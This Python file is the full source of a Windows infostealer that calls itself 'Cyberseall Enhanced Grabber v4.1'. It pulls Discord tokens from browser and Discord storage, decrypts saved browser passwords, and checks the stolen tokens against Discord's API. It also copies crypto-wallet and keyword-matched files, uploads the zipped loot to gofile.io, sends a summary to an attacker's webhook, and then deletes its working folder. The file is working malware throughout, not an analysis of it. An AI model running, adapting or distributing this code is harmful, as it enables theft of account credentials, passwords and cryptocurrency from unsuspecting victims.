import os,re,requests,base64,getpass,sqlite3,shutil,platform,socket,json,zipfile,time,win32crypt,threading,psutil,subprocess
try:from Crypto.Cipher import AES
except:__import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])

class CyberseallGrabber:
    def __init__(self, webhook_url):
        self.w = webhook_url
        self.t = []
        self.vt = []
        self.p = []
        self.f = []
        self.d = os.path.join(os.getenv("APPDATA"), "cyberseall")
        self.keywords = ['password','passwords','wallet','wallets','seed','seeds','private','privatekey','backup','backups','recovery']
        self.setup()
        self.g()
        self.vt = self.validate_tokens()
        self.pw()
        self.fi()
        self.si()
        self.up()
        self.send()
        self.cleanup()

    def setup(self):
        try:
            if not os.path.exists(self.d):
                os.makedirs(self.d)
            self.zf = os.path.join(self.d, "grab_" + str(int(time.time())) + ".zip")
        except:
            pass

    def g(self):
        try:
            def decrypt(buff, master_key):
                try:
                    return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
                except:
                    return "Error"
            
            tokens = []
            cleaned = []
            checker = []
            already_check = []
            
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')
            chrome = local + "\\Google\\Chrome\\User Data"
            
            paths = {
                'Discord': roaming + '\\discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Lightcord': roaming + '\\Lightcord',
                'Discord PTB': roaming + '\\discordptb',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
                'Amigo': local + '\\Amigo\\User Data',
                'Torch': local + '\\Torch\\User Data',
                'Kometa': local + '\\Kometa\\User Data',
                'Orbitum': local + '\\Orbitum\\User Data',
                'CentBrowser': local + '\\CentBrowser\\User Data',
                '7Star': local + '\\7Star\\7Star\\User Data',
                'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
                'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
                'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
                'Chrome': chrome + '\\Default',
                'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
                'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
                'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Iridium': local + '\\Iridium\\User Data\\Default'
            }
            
            for platform, path in paths.items():
                if not os.path.exists(path): 
                    continue
                try:
                    with open(path + f"\\Local State", "r") as file:
                        key = json.loads(file.read())['os_crypt']['encrypted_key']
                        file.close()
                except: 
                    continue
                    
                leveldb_path = path + f"\\Local Storage\\leveldb\\"
                if not os.path.exists(leveldb_path):
                    continue
                    
                for file in os.listdir(leveldb_path):
                    if not file.endswith(".ldb") and not file.endswith(".log"): 
                        continue
                    try:
                        with open(leveldb_path + file, "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: 
                        continue
                        
                for i in tokens:
                    if i.endswith("\\"):
                        i.replace("\\", "")
                    elif i not in cleaned:
                        cleaned.append(i)
                        
                for token in cleaned:
                    try:
                        tok = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                        if tok != "Error":
                            checker.append(tok)
                    except:
                        continue
                        
                for value in checker:
                    if value not in already_check and len(value) > 50:
                        already_check.append(value)
                        self.t.append(value)
            
        except:
            pass

    def validate_tokens(self):
        valid_tokens = []
        for token in self.t[:10]:  # Validiere bis zu 10 Token
            try:
                headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
                r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                if r.status_code == 200:
                    user_data = r.json()
                    token_info = {
                        'token': token,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'Hidden'),
                        'phone': user_data.get('phone', 'None'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'premium_type': user_data.get('premium_type', 0)
                    }
                    valid_tokens.append(token_info)
            except:
                pass
        return valid_tokens

    def pw(self):
        try:
            pw_data = []
            
            def get_master_key(path):
                try:
                    with open(path + "\\Local State", "r", encoding="utf-8") as f:
                        c = f.read()
                    local_state = json.loads(c)
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                except:
                    return None
            
            def decrypt_password(buff, master_key):
                try:
                    iv = buff[3:15]
                    payload = buff[15:]
                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                    decrypted_pass = cipher.decrypt(payload)
                    decrypted_pass = decrypted_pass[:-16].decode()
                    return decrypted_pass
                except:
                    return "Failed to decrypt"
            
            # Browser-Pfade für Passwörter
            browsers = [
                ("Chrome", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default")),
                ("Chrome Canary", os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default")),
                ("Edge", os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default")),
                ("Brave", os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default")),
                ("Opera", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable")),
                ("Opera GX", os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")),
                ("Vivaldi", os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default")),
                ("Yandex", os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"))
            ]
            
            for browser_name, browser_path in browsers:
                try:
                    if not os.path.exists(browser_path):
                        continue
                        
                    master_key = get_master_key(browser_path)
                    if not master_key:
                        continue
                        
                    login_db = os.path.join(browser_path, "Login Data")
                    if not os.path.exists(login_db):
                        continue
                        
                    # Kopiere die Datenbank in temp
                    temp_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_login.db")
                    shutil.copy2(login_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        if row[0] and row[1] and row[2]:
                            url = row[0]
                            username = row[1]
                            encrypted_password = row[2]
                            
                            decrypted_password = decrypt_password(encrypted_password, master_key)
                            pw_data.append(f"{browser_name} - {url} - {username} - {decrypted_password}")
                    
                    conn.close()
                    os.remove(temp_db)
                    
                except Exception as e:
                    continue
            
            self.p = pw_data
            with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                f.write("\n".join(pw_data))
        except:
            pass

    def fi(self):
        try:
            files_data = []
            
            # Nur die wichtigsten Verzeichnisse durchsuchen
            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:  # Limit auf 10 Dateien pro Verzeichnis
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            
            # Nur die wichtigsten Crypto-Wallets für bessere Performance
            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:  # Limit auf 5 Dateien pro Wallet
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def si(self):
        try:
            sys_info = {
                "user": getpass.getuser(),
                "computer": os.getenv("COMPUTERNAME", "Unknown"),
                "platform": platform.platform(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "tokens_found": len(set(self.t)),
                "valid_tokens": len(self.vt),
                "passwords_found": len(self.p),
                "files_found": len(self.f)
            }
            with open(os.path.join(self.d, "system_info.json"), "w") as f:
                json.dump(sys_info, f, indent=2)
            with open(os.path.join(self.d, "valid_tokens.json"), "w") as f:
                json.dump(self.vt, f, indent=2)
        except:
            pass

    def up(self):
        try:
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            zf.write(fp, os.path.relpath(fp, self.d))
            
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL ENHANCED GRABBER v4.1",
                    "color": 0xff0000,
                    "fields": [
                        {
                            "name": "💎 Results",
                            "value": "```" + str(len(set(self.t))) + " Raw Tokens\n" + str(len(self.vt)) + " Valid Tokens\n" + str(len(self.p)) + " Browser Passwords\n" + str(len(self.f)) + " Keyword Files```"
                        },
                        {
                            "name": "💻 Target",
                            "value": "```" + getpass.getuser() + "@" + os.getenv("COMPUTERNAME", "?") + "```"
                        },
                        {
                            "name": "📁 Download",
                            "value": "[**CLICK HERE TO DOWNLOAD**](" + str(self.link if hasattr(self, 'link') else 'Failed') + ")",
                            "inline": False
                        }
                    ],
                    "footer": {"text": "Cyberseall ENHANCED Grabber v4.1 - Fixed Token & Password Decryption"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
            # Sende alle validen Token
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:5]):  # Max 5 Token
                    token_embed = {
                        "embeds": [{
                            "title": "✅ VALID TOKEN #" + str(i+1),
                            "color": 0x00ff00,
                            "fields": [
                                {
                                    "name": "👤 User",
                                    "value": "```" + token_info.get('username', '?') + "#" + token_info.get('discriminator', '?') + "```"
                                },
                                {
                                    "name": "📧 Email",
                                    "value": "```" + str(token_info.get('email', 'Hidden')) + "```"
                                },
                                {
                                    "name": "📱 Phone",
                                    "value": "```" + str(token_info.get('phone', 'None')) + "```"
                                },
                                {
                                    "name": "🔐 Token",
                                    "value": "```" + token_info['token'][:50] + "...```"
                                },
                                {
                                    "name": "💎 Premium",
                                    "value": "```Type: " + str(token_info.get('premium_type', 0)) + "\nMFA: " + str(token_info.get('mfa_enabled', False)) + "\nVerified: " + str(token_info.get('verified', False)) + "```"
                                }
                            ],
                            "footer": {"text": "Valid Token Info"},
                            "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                        }]
                    }
                    requests.post(self.w, json=token_embed, timeout=5)
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
